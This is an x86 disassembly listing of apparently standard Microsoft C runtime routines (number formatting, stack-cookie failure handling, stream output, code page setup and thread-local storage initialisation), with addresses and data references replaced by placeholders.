mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] edx
jb r-xdata
mov [ ecx ] dl
inc ecx
inc [ ebp - 0x4 ]
xor ebx ebx
cmp eax ebx
jbe r-xdata
mov [ ecx ] bl
dec ecx
mov [ esi ] bl
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_428d81
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_428ca4
pop ebp
retn
sub_428dab
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_42b58c
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_42b58c
pop ecx
sub_428eb1
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_42c50d
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_425eb1
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_425eb1
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_42b61a
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_42cfe4
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_43490c
pop ecx
test eax eax
jne r-xdata
call sub_42b61a
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_42cfe4
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_4348c3
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_4347aa
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_429015
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_434b0f
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_425eb1
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_434b0f
sub_429062
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_423619
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_425eb1
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423d36
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_42c50d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_429bfa
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_428eb1
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_429cc6
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_425eb1
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423d36
add esp 0x14
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_434b68
call sub_429bfa
add esp 0x18
cmp eax ebx
jge r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] bl
pop esi
call sub_425eb1
mov [ eax ] 0x22
sub_429d4e
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_429d7d
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_42b5a0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_429de1
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_430a86
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_428525
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_428525
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_42b5a0
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_429f74
push 0xc
push r--data
call sub_42b398
call sub_42a735
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a00f
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_42b3dd
retn
push 0x20
call sub_42af2d
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_424869
pop ecx
sub_42a018
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_423619
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_42a094
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_42a018
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_429d7d
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_42b5a0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_429d4e
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_429de1
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_42b5a0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_429d4e
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_42a279
push 0x14
push r--data
call sub_42b398
or [ ebp - 0x20 ] 0xffffffff
call sub_42a735
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_429f74
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_42a018
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_428905
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_42b3dd
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_42a094
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_425eb1
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_424869
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_424869
pop ecx
push 0xd
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a3da
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_424869
pop ecx
sub_42a431
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_42aefd
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_42a4ac
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_42aefd
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_42a547
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_42a4ac
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_42a598
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_42a4ac
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_42e187
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_42a5d5
push 0xc
push r--data
call sub_42b398
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_42aefd
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a6aa
push 0xc
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_426569
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a6b3
call sub_42b3dd
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_42a6bc
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_42a547
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_42894a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_42a4ac
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_424869
pop ecx
xor esi esi
push 0x0
push esi
call sub_42a5d5
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_42a74f
push 0x8
push r--data
call sub_42b398
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_42b3dd
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_424869
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_424869
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_424869
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_424869
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_424869
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_424869
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_424869
pop ecx
push 0xd
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_424869
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a869
push 0xc
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a875
push esi
call sub_424869
pop ecx
push edi
call sub_4265f8
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_424869
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_426420
pop ecx
sub_42a87e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_42a4ac
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_42a74f
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_42a8ec
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_42aefd
pop ecx
call sub_42a598
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_42a51e
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
